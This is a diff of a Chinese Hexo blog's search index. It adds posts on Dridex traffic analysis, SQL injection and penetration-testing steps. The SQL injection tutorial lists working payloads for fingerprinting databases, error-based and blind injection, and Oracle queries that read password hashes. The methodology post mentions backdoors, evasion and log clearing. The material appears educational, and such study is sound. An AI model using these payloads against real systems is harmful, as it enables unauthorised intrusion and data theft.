+<p>​        可以看到在IDS警报列表最下面这些“dridex证书警报”之前，有个“可执行文件下载”的警报，可得        出Windows EXE或DLL文件是从91.121.30.169的TCP端口8000下载的，需要从流量中提取这个样        本文件。</p>
+<h3 id="步骤5-提取样本文件"><a href="#步骤5-提取样本文件" class="headerlink" title="步骤5 提取样本文件"></a><strong>步骤5 提取样本文件</strong></h3><p>​        在wireshark中菜单 File → Export Objects → HTTP ，可以找到一些对分析有意义的文件，如压        缩文件、文本文件、音频文件、图片等。</p>
+<p>​        在导出这些文件之前，怎么判断哪个是Windows可执行文件呢? Follow 这个HTTP请求的TCP流，        可以从3处发现特征可以确定Windows可执行文件（exe或dll），如下图所示。  </p>
+<p>​        请求头中包含有：</p>
+<p>​        <img src="C:%5CUsers%5C%E5%AD%99%E8%85%BE%E9%A3%9E%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571450418761.png" alt="1571450418761"></p>
+<p>​         从pcap提取到了恶意样本文件。 </p>
+<p>​         现在可以自己计算hash，也可以顺手提交给VirusTotal获得更多有关它的信息、IoC等。 </p>
+<p>​         简介：Dridex是一种专门针对银行的恶意软件，它利用Microsoft Office中的宏来感染系统。一        旦计算机被感染，Dridex攻击者就可以窃取系统上的银行凭据和其他个人信息，以访问用户的财        务记录。 </p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        流量分析作为企业网络安全防御体系的重要的一部分，与日志分析等相结合，尽可能完整还原恶        意软件攻击过程，这样才有可能将恶意软件从企业网络中彻底清理，同时对流量特征进行分析，        可得到并整理出IoC、相关样本文件、甚至是写出一份完整的分析报告。</p>
+]]></content>
+      <categories>
+        <category>流量分析</category>
+      </categories>
+      <tags>
+        <tag>流量分析</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入</title>
+    <url>/2019/10/15/sql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<hr>
+<a id="more"></a>
+
+<h3 id="SQL注入影响"><a href="#SQL注入影响" class="headerlink" title="SQL注入影响"></a>SQL注入影响</h3><p>   作为长期占据 OWASP Top 10 首位的注入，认识它掌握它是每个渗透测试人员必不可少的一个过程。</p>
+<h3 id="SQL注入简介"><a href="#SQL注入简介" class="headerlink" title="SQL注入简介"></a>SQL注入简介</h3><blockquote>
+<p>所谓SQL注入，就是通过把SQL命令插入到Web提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。 </p>
+</blockquote>
+<h3 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h3><blockquote>
+<p>程序命令没能对用户输入的内容能作出正确的处理导致执行非预期命令或访问数据。或者说产生注入的原因是接受相关参数未经正确处理直接带入数据库进行查询操作。发起注入攻击需要存在可控参数（数据）提交方式的确认和SQL命令相关点。 </p>
+</blockquote>
+<h3 id="明确常见存在SQL注入网站链接形式"><a href="#明确常见存在SQL注入网站链接形式" class="headerlink" title="明确常见存在SQL注入网站链接形式"></a>明确常见存在SQL注入网站链接形式</h3><ul>
+<li><p>常见的出现SQL注入的网站链接形式:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://www.****************.com/***.asp?id=xx  （ASP）</span><br><span class="line">http://www.****************.com/***.php?id=xx   (PHP)</span><br><span class="line">http://www.****************.com/***.jsp?id=xx   (JSP)</span><br><span class="line">http://www.****************.com/***.aspx?id=xx  (ASPX)</span><br><span class="line">http://www.****************.com/***.asp?id=xx&amp;page=** (注入的时候需要明确注入的参数是id还是page,工具默认对后面的page参数进行注入，如需改变需要手动设置)</span><br><span class="line">http://www.zhangweishibi***.com/news/id/* 伪静态</span><br><span class="line">http://www.zhangweishibi***.com/index/new/php8.html 伪静态</span><br><span class="line">（**在这里代表有可能为数字或者字符串）</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>常见脚本数据库默认组合</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">asp  +  access/SQLServer</span><br><span class="line">php  +  Mysql</span><br><span class="line">jsp  +  Oracle</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h3 id="常见判断是否存在注入漏洞的方法"><a href="#常见判断是否存在注入漏洞的方法" class="headerlink" title="常见判断是否存在注入漏洞的方法"></a>常见判断是否存在注入漏洞的方法</h3><ol>
+<li><p>单双引号报错法</p>
+<blockquote>
+<p>在网站链接地址后面加上单或者双引号，网站没能正常显示而是显示异常信息，则说明该链接可能存在注入漏洞。一般返回的异常信息包含有SQL语句，知道目标网站的SQL语句至关重要，因为知道SQL语句可以更好绕过检测进行注入。</p>
+</blockquote>
+</li>
+<li><p>正确错误法</p>
+<blockquote>
+<p>我把它命名为正确错误法，其实它就是就是经典的and 1=1、and 1=2 测试法。利用的是1=1永远为真，1=2永远为假的原理。当使用and 1=1进行测试时返回正常页面而and 1=2进行测试时返回错误页面或者页面没有正常显示则说明该链接存在SQL 漏洞。 </p>
+</blockquote>
+</li>
+</ol>
+<h3 id="SQL注入参数类型判断"><a href="#SQL注入参数类型判断" class="headerlink" title="SQL注入参数类型判断"></a>SQL注入参数类型判断</h3><p>按参数类型主要分为下面三种：</p>
+<ol>
+<li><p>数字型</p>
+<blockquote>
+<p>字段=数字 这类注入的参数是数字型，SQL 语句原貌大致如下：<code>Select * from user where 字段=1</code>;</p>
+<p>注入的参数为 ID=49 And [查询条件]，即是生成语句：<code>Select * from 表名 where 字段=49 And [查询条件]</code></p>
+</blockquote>
+</li>
+<li><p>字符型</p>
+<blockquote>
+<p>SQL 语句原貌大致概如下：<code>Select * from 表名 where 字段=&#39;asd&#39;</code></p>
+</blockquote>
+</li>
+<li><p>搜索型</p>
+<blockquote>
+<p>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“keyword=关键字”，有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：<code>select * from 表名 where 字段 like &#39;%关键字%&#39;</code>。</p>
+</blockquote>
+</li>
+</ol>
+<h3 id="判断常见数据库类型"><a href="#判断常见数据库类型" class="headerlink" title="判断常见数据库类型"></a>判断常见数据库类型</h3><ul>
+<li><p>不同的数据库的函数、注入方法都是有差异的，所以在注入之前，我们还要判断一下数据库的类型。识别数据库管理系统(DBMS)的类型是注入中不可或缺的一环，因为不知道DBMS的类型，不同的DBMS都有特有的属性或者内置功能，而我们注入的时候往往需要使用到其特有的属性或者内置功能，所以识别DBMS的类型是不可或缺的一部分。（–在数据库中代表是注释的意思）注意：以下方法可能会因为数据库版本的不同产生差异。 </p>
+</li>
+<li><p>MYSQL数据库</p>
+<table>
+<thead>
+<tr>
+<th>描述</th>
+<th>语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SLEEP（睡眠）</td>
+<td>page.php?id=1-SLEEP(1)=0 LIMIT 1 –</td>
+</tr>
+<tr>
+<td>BENCHMARK</td>
+<td>page.php?id=1-BENCHMARK(5000000,ENCODE(‘str’,’key’) )=1 LIMIT 1 –</td>
+</tr>
+<tr>
+<td>字符串拼接</td>
+<td>page.php?id=` ‘mysql’ –</td>
+</tr>
+<tr>
+<td>触发错误有可能会报出DBMS类型</td>
+<td>page.php?id=`</td>
+</tr>
+<tr>
+<td>联合查询</td>
+<td>product.php?id=` UNION (SELECT @@version) –</td>
+</tr>
+</tbody></table>
+<p>Oracle数据库</p>
+<blockquote>
+<p>根据应用程序所提供的错误，如果有一个“ora-xxxx”错误，每个x是一个整数，这意味着数据库是Oracle，JSP应用程序通常有Oracle数据库。 </p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>联合</th>
+<th>product.jsp?id=’ UNION SELECT banner FROM v$version –</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>联合查询</td>
+<td>product.jsp?id=’ UNION (SELECT banner FROM v$version) –</td>
+</tr>
+<tr>
+<td>联合空值 注意：如果原始查询返回多个列，加零等于columns-1</td>
+<td>product.jsp?id=’ UNION SELECT banner,null FROM v$version –</td>
+</tr>
+</tbody></table>
+<p>SQL Server</p>
+<table>
+<thead>
+<tr>
+<th>延时函数</th>
+<th>page.asp?id=’;WAITFOR DELAY ’00:00:10′; –</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>默认变量</td>
+<td>page.asp?id=sql’; SELECT @@SERVERNAME –</td>
+</tr>
+<tr>
+<td>触发错误有可能会报出DBMS类型</td>
+<td>page.asp?id=0/@@SERVERNAME</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<h3 id="认识SQL注入类型"><a href="#认识SQL注入类型" class="headerlink" title="认识SQL注入类型"></a>认识SQL注入类型</h3><ol>
+<li><p>基于报错注入</p>
+<p>页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>
+<p>MYSQL数据库 </p>
+</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th align="left">描述</th>
+<th align="center">查询语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">XML 解析错误</td>
+<td align="center">SELECT extractvalue(rand(),concat(0x3a,(select version())))</td>
+</tr>
+<tr>
+<td align="left">子查询</td>
+<td align="center">SELECT 1 AND(SELECT 1 FROM(SELECT COUNT(),concat(0x3a,(SELECT username FROM USERS LIMIT 0,1),FLOOR(rand(0)2))x FROM information_schema.TABLES GROUP BY x)a) Increment Limit 0,1 to Limit 1,1 to begin cycling through data</td>
+</tr>
+<tr>
+<td align="left">获取当前数据库</td>
+<td align="center">SELECT a()</td>
+</tr>
+</tbody></table>
+<p> Oracle数据库 </p>
+<table>
+<thead>
+<tr>
+<th>描述</th>
+<th>查询语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>无效HTTP请求</td>
+<td>SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual</td>
+</tr>
+<tr>
+<td>CTXSYS.DRITHSX.SN</td>
+<td>SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual</td>
+</tr>
+<tr>
+<td>无效xml路径</td>
+<td>SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual</td>
+</tr>
+<tr>
+<td>无效XML</td>
+<td>SELECT to_char(dbms_xmlgen.getxml(‘select “‘||(select user from sys.dual)||’” FROM sys.dual’)) FROM dual</td>
+</tr>
+<tr>
+<td>无效XML</td>
+<td>SELECT rtrim(extract(xmlagg(xmlelement(“s”, username || ‘,’)),’/s’).getstringval(),’,’) FROM all_users</td>
+</tr>
+</tbody></table>
+<p>SQL server</p>
+<table>
+<thead>
+<tr>
+<th>描述</th>
+<th>查询语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>显式转换</td>
+<td>SELECT convert(int,(SELECT @@version)) SELECT cast((SELECT @@version) as int)</td>
+</tr>
+<tr>
+<td>隐式转换</td>
+<td>SELECT 1/@@version</td>
+</tr>
+</tbody></table>
+<ol start="2">
+<li><p>基于时间的盲注</p>
+<p>不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。函数sleep();</p>
+</li>
+<li><p>基于布尔的盲注</p>
+<p>MYSQL数据库</p>
+<p>返回页面判断条件真假的注入。</p>
+<p>部分盲注可以观察不同的HTTP状态码，确定响应时间、内容的长度，并在HTTP响应中的查看HTML内容来进行确认。</p>
+<table>
+<thead>
+<tr>
+<th>描述</th>
+<th>查询语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>数据库版本是否等于5..</td>
+<td>SELECT substring(version(),1,1)=5</td>
+</tr>
+<tr>
+<td>重复使用语句</td>
+<td>SELECT 1 AND (select 1)=1</td>
+</tr>
+<tr>
+<td>查询log_table是否存在</td>
+<td>SELECT 1 AND (select 1 from log_table limit 0,1)=1</td>
+</tr>
+<tr>
+<td>查询第一个字符是否为T</td>
+<td>SELECT ascii(substring((SELECT message from log_table limit 0,1),1,1))=114</td>
+</tr>
+</tbody></table>
+<p> 全盲 </p>
+<table>
+<thead>
+<tr>
+<th>描述</th>
+<th>查询语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>是否是根用户</td>
+<td>SELECT IF(user() LIKE ‘root@%’, SLEEP(5), null)</td>
+</tr>
+<tr>
+<td>是否是根用户(方法)</td>
+<td>SELECT IF(user() LIKE ‘root@%’, BENCHMARK(5000000, ENCODE(‘Slow Down’,’by 5 seconds’)), null)</td>
+</tr>
+<tr>
+<td>数据库版本是否等于5..</td>
+<td>SELECT IF(SUBSTRING(version(),1,1)=5,SLEEP(5),null)</td>
+</tr>
+</tbody></table>
+</li>
+</ol>
+<h3 id="SQL注入常用函数及注入语句"><a href="#SQL注入常用函数及注入语句" class="headerlink" title="SQL注入常用函数及注入语句"></a>SQL注入常用函数及注入语句</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Access：asc(字符) SQLServer：unicode(字符) 作用：返回某字符的 ASCII 码</span><br><span class="line">Access：chr(数字) SQLServer：nchar(数字) 作用：与 asc 相反，根据 ASCII 码返回字符</span><br><span class="line">Access：mid(字符串,N,L) SQLServer：substring(字符串,N,L) 作用：返回字符串从 N 个字符起长度为 L 的子字符串，即 N 到 N+L 之间的字符串</span><br><span class="line">Access：abc(数字) SQLServer：abc (数字) 作用：返回数字的绝对值（在猜解汉字的时候会用到）</span><br><span class="line">Access：A between B And C SQLServer：A between B And C 作用：判断 A 是否界于 B 与 C 之间</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Mysql:</span><br><span class="line">version() MySQL 版本</span><br><span class="line">user()  数据库用户名</span><br><span class="line">database() 数据库名</span><br><span class="line">@@datadir 数据库路径</span><br><span class="line">@@version_compile_os  操作系统版本</span><br><span class="line">hex() 把十进制转为十六进制</span><br><span class="line">concat() 连接字符串</span><br><span class="line">ascii() ascii编码</span><br><span class="line">length（) 获取长度</span><br><span class="line">substring() mid（） 取出字符串</span><br><span class="line">group_concat() 连接一个组的所有字符串 以逗号分隔每一条数据</span><br><span class="line">updatexml()、extractvalue() 用于报错注入</span><br><span class="line">sleep（） 休眠</span><br><span class="line"></span><br><span class="line">猜数据库 select schema_name from information_schema.schemata</span><br><span class="line">猜某库的数据表 select table_name from information_schema.tables <span class="built_in">where</span> table_schema=’xxxxx’</span><br><span class="line">猜某表的所有列 Select column_name from information_schema.columns <span class="built_in">where</span> table_name=’xxxxx’</span><br><span class="line">获取某列的内容 Select xx_column from xx_table</span><br><span class="line"></span><br><span class="line">列出所有的数据库</span><br><span class="line">select group_concat(schema_name) from information_schema.schemata</span><br><span class="line"></span><br><span class="line">列出某个库当中所有的表</span><br><span class="line">select group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">'xxxxx'</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Oracle</span><br><span class="line">解析IP</span><br><span class="line">select utl_inaddr.get_host_address(<span class="string">'google.com'</span>) from dual;</span><br><span class="line"></span><br><span class="line">获取本机IP地址</span><br><span class="line">select utl_inaddr.get_host_address from dual;</span><br><span class="line"></span><br><span class="line">根据IP地址反向解析主机名</span><br><span class="line">select utl_inaddr.get_host_name(<span class="string">'*.*.*.*'</span>) from dual;</span><br><span class="line"></span><br><span class="line">-- 获取系统信息</span><br><span class="line">select banner from v<span class="variable">$version</span> <span class="built_in">where</span> rownum=1 ; -- oracle versi</span><br><span class="line"></span><br><span class="line">--获取用户信息</span><br><span class="line">select user from dual; -- current user</span><br><span class="line">select username from user_users; -- current user</span><br><span class="line">select username from all_users; -- all user , the current user can see...</span><br><span class="line">select username from dba_users; -- all user , need pris</span><br><span class="line"></span><br><span class="line">-- 获取密码<span class="built_in">hash</span></span><br><span class="line">select name, password, astatus from sys.user$; -- password <span class="built_in">hash</span> &lt;=10g , need privs</span><br><span class="line">select name, password, spare4 from sys.user$; -- password has 11g , need privs</span><br><span class="line"></span><br><span class="line">-- 数据库</span><br><span class="line">select global_name from global_name; -- current database</span><br><span class="line">select sys.database_name from dual; -- current database</span><br><span class="line">select name from v<span class="variable">$database</span>; -- current database name , need privs</span><br><span class="line">select instance_name from v<span class="variable">$instance</span>; -- current database name , need privs</span><br><span class="line"></span><br><span class="line">-- 模式</span><br><span class="line">select distinct owner from all_tables; -- all schema</span><br><span class="line"></span><br><span class="line">-- 表</span><br><span class="line">select table_name from all_tables <span class="built_in">where</span> owner=<span class="string">'xxx'</span>; -- all table name</span><br><span class="line"></span><br><span class="line">-- 列</span><br><span class="line">select owner,table_name,column_name from all_tab_columns <span class="built_in">where</span> table_name=<span class="string">'xxx'</span>;</span><br><span class="line">select owner,table_name,column_name from all_tab_cols <span class="built_in">where</span> table_name=<span class="string">'xxx'</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h3><blockquote>
 <p>1’ and length(database())&gt;7–+</p>
 </blockquote>
 <blockquote>
 <p>1’ and ascii(left(database(),1))&gt;122 115 s</p>
 </blockquote>
-<h3 id="sql-mid-函数"><a href="#sql-mid-函数" class="headerlink" title="sql mid 函数"></a>sql mid 函数</h3><p>sql left<br>sql sleep<br>1’ and if(ascii(left(database(),1))=115,sleep(5),1)–+</p>
-<h3 id="sql-注入原理"><a href="#sql-注入原理" class="headerlink" title="sql 注入原理"></a>sql 注入原理</h3><h3 id="SQL注入危害"><a href="#SQL注入危害" class="headerlink" title="SQL注入危害"></a>SQL注入危害</h3><ol>
+<h3 id="sql-mid-函数"><a href="#sql-mid-函数" class="headerlink" title="sql mid 函数"></a>sql mid 函数</h3><p>sql left<br>1’ and if(ascii(left(database(),1))=115,sleep(5),1)–+</p>
+<h3 id="SQL注入危害"><a href="#SQL注入危害" class="headerlink" title="SQL注入危害"></a>SQL注入危害</h3><ol>
 <li>数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。<br>网页篡改：通过操作数据库对特定网页进行篡改。<br>网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。<br>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。<br>服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。<br>破坏硬盘数据，瘫痪全系统。<br>一些类型的数据库系统能够让SQL指令操作文件系统，这使得SQL注入的危害被进一步放大</li>
 </ol>
 <h3 id="sql-注入分类"><a href="#sql-注入分类" class="headerlink" title="sql 注入分类"></a>sql 注入分类</h3><ul>
@@ -203,84 +753,104 @@
   <entry>
     <title>渗透测试</title>
     <url>/2019/10/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
-    <content><![CDATA[<a id="more"></a>]]></content>
-  </entry>
-  <entry>
-    <title>应急响应</title>
-    <url>/2019/10/14/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>极限加固</title>
-    <url>/2019/10/14/%E6%9E%81%E9%99%90%E5%8A%A0%E5%9B%BA/</url>
-    <content><![CDATA[]]></content>
-      <tags>
-        <tag>安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>my-first-blog</title>
-    <url>/2019/10/14/my-first-blog(2)/</url>
-    <content><![CDATA[<p>文件目录  类别   编码  语言 设置</p>
-<hr>
-<hr>
-<hr>
+    <content><![CDATA[<hr>
+<a id="more"></a>
+<h2 id="渗透测试的8个步骤"><a href="#渗透测试的8个步骤" class="headerlink" title="渗透测试的8个步骤"></a>渗透测试的8个步骤</h2><ul>
+<li>渗透测试这个事情不是随便拿个工具就可以做了，要了解业务，还需要给出解决方案</li>
+</ul>
+<h3 id="渗透测试与入侵的区别"><a href="#渗透测试与入侵的区别" class="headerlink" title="渗透测试与入侵的区别"></a>渗透测试与入侵的区别</h3><ol>
+<li><p>渗透测试：以安全为基本原则，通过攻击者以及防御者的角度去分析目标所存在的安全隐患以及脆弱性，以保护系统安全为最终目标。</p>
+</li>
+<li><p>入侵：通过各种方法，甚至破坏性的操作，来获取系统权限以及各种敏感信息。</p>
+</li>
+</ol>
+<h3 id="一般渗透测试流程"><a href="#一般渗透测试流程" class="headerlink" title="一般渗透测试流程"></a>一般渗透测试流程</h3><ol>
+<li><p>明确目标</p>
+<p>确定范围：测试目标的范围、ip、域名、内外网、测试账户。</p>
+<p>确定规则：能渗透到什么程度，所需要的时间、能否修改上传、能否提权、等等。</p>
+<p>确定需求：web应用的漏洞、业务逻辑漏洞、人员权限管理漏洞、等等。</p>
+</li>
+<li><p>信息收集</p>
+<p>方式：主动扫描，开放搜索等。</p>
+<p>开放搜索：利用搜索引擎获得：后台、未授权页面、敏感url、等等。</p>
+<p>基础信息：IP、网段、域名、端口。</p>
+<p>应用信息：各端口的应用。例如web应用、邮件应用、等等。</p>
+<p>系统信息：操作系统版本</p>
+<p>版本信息：所有这些探测到的东西的版本。</p>
+<p>服务信息：中间件的各类信息，插件信息。</p>
+<p>人员信息：域名注册人员信息，web应用中发帖人的id，管理员姓名等。</p>
+<p>防护信息：试着看能否探测到防护设备。</p>
+</li>
+<li><p>漏洞探测</p>
+<p>利用上一步中列出的各种系统，应用等使用相应的漏洞。</p>
+</li>
+</ol>
+<ul>
+<li><p>方法：</p>
+<p> (1) 漏扫，awvs，IBM appscan等。</p>
+<p> (2) 结合漏洞去exploit-db等位置找利用。</p>
+<p> (3) 在网上寻找验证poc。</p>
+</li>
+<li><p>内容：</p>
+<p> 系统漏洞：系统没有及时打补丁</p>
+<p> WebSever漏洞：WebSever配置问题</p>
+<p> Web应用漏洞：Web应用开发问题</p>
+<p> 其它端口服务漏洞：各种21/8080(st2)/7001/22/3389</p>
+<p> 通信安全：明文传输，token在cookie中传送等。</p>
+</li>
+</ul>
+<ol start="4">
+<li><p>漏洞验证</p>
+<p>将上一步中发现的有可能可以成功利用的全部漏洞都验证一遍。结合实际情况，搭建模拟环境进行试验。成功后再应用于目标中。</p>
+<p>自动化验证：结合自动化扫描工具提供的结果</p>
+<p>手工验证，根据公开资源进行验证</p>
+<p>试验验证：自己搭建模拟环境进行验证</p>
+<p>登陆猜解：有时可以尝试猜解一下登陆口的账号密码等信息</p>
+<p>业务漏洞验证：如发现业务漏洞，要进行验证</p>
+</li>
+</ol>
+<ul>
+<li><p>公开资源的利用</p>
+<p> exploit-db/wooyun/</p>
+<p> google hacking</p>
+<p> 渗透代码网站</p>
+<p> 通用、缺省口令</p>
+<p> 厂商的漏洞警告等等。</p>
+</li>
+</ul>
+<ol start="5">
+<li><p>信息分析</p>
+<p>为下一步实施渗透做准备。</p>
+<p>精准打击：准备好上一步探测到的漏洞的exp，用来精准打击</p>
+<p>绕过防御机制：是否有防火墙等设备，如何绕过</p>
+<p>定制攻击路径：最佳工具路径，根据薄弱入口，高内网权限位置，最终目标</p>
+<p>绕过检测机制：是否有检测机制，流量监控，杀毒软件，恶意代码检测等（免杀）</p>
+<p>攻击代码：经过试验得来的代码，包括不限于xss代码，sql注入语句等</p>
+</li>
+<li><p>获取所需</p>
+<p>实施攻击：根据前几步的结果，进行攻击</p>
+<p>获取内部信息：基础设施（网络连接，vpn，路由，拓扑等）</p>
+<p>进一步渗透：内网入侵，敏感目标</p>
+<p>持续性存在：一般我们对客户做渗透不需要。rookit，后门，添加管理账号，驻扎手法等</p>
+<p>清理痕迹：清理相关日志（访问，操作），上传文件等</p>
+</li>
+<li><p>信息整理</p>
+<p>整理渗透工具：整理渗透过程中用到的代码，poc，exp等</p>
+<p>整理收集信息：整理渗透过程中收集到的一切信息</p>
+<p>整理漏洞信息：整理渗透过程中遇到的各种漏洞，各种脆弱位置信息</p>
+</li>
+<li><p>形成报告</p>
+<p>按需整理：按照之前第一步跟客户确定好的范围，需求来整理资料，并将资料形成报告</p>
+<p>补充介绍：要对漏洞成因，验证过程和带来危害进行分析</p>
+<p>修补建议：当然要对所有产生的问题提出合理高效安全的解决办法</p>
+</li>
+</ol>
 ]]></content>
       <categories>
-        <category>搭建博客</category>
+        <category>渗透测试</category>
       </categories>
       <tags>
-        <tag>npm</tag>
-        <tag>hexo</tag>
-        <tag>github</tag>
+        <tag>渗透测试</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>my-first-blog</title>
-    <url>/2019/10/14/my-first-blog(1)/</url>
-    <content><![CDATA[<p>文件目录  类别   编码  语言 设置</p>
-<hr>
-<hr>
-]]></content>
-      <categories>
-        <category>搭建博客</category>
-      </categories>
-      <tags>
-        <tag>npm</tag>
-        <tag>hexo</tag>
-        <tag>github</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>my-first-blog</title>
-    <url>/2019/10/14/my-first-blog/</url>
-    <content><![CDATA[<p>文件目录  类别   编码  语言 设置</p>
-]]></content>
-      <categories>
-        <category>搭建博客</category>
-      </categories>
-      <tags>
-        <tag>npm</tag>
-        <tag>hexo</tag>
-        <tag>github</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2019/10/13/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-]]></content>
   </entry>
 </search>
